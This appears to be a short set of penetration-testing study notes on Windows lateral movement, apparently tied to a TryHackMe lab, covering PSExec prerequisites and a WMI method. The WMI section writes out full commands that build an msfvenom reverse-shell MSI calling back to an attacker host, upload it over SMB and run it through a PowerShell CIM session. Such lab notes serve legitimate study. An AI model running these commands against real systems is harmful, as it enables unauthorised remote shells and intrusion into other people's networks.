### PSExec
[PSExec download](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)
Required: 
- Port 445 (or any SMB) open
- Administrator group access
?


### WMI
https://benheater.com/tryhackme-lateral-movement-pivoting/#task-4-moving-laterally-using-wmi
Required:
- Port 135 (RCP)
- Port 5985/5986 (WinRM)
- Administrator group on target

#### Method 1 - with SMB
First, generate the reverse shell:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -f msi -o shell.msi
```
Then, put the shell on the system:
```bash
smbclient -c 'put shell.msi' -U $USERNAME -W WORKGROUP '//IP_ADDRES_OR_HOSTNAME/admin$/' $PASSWORD
```
First, create a `Credential Object`, for authentication (Powershell):
```powershell
$username = 'user'
$password = 'password' | ConvertTo-SecureString -AsPlainText -Force
$credential = [pscredential]::new($username, $password)
```

Create a CIM (WMI Connection) session:
```powershell
$server = 'target-ip / fqdn'
$sessionopt = New-CimSessionOption -Protocol DCOM
$session = New-CimSession -ComputerName $server -Credential $credential -SessionOption $sessionopt -ErrorAction Stop
```
Then, execute the reverse shell:
```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\shell.msi"; Options = ""; AllUsers = $false}
```
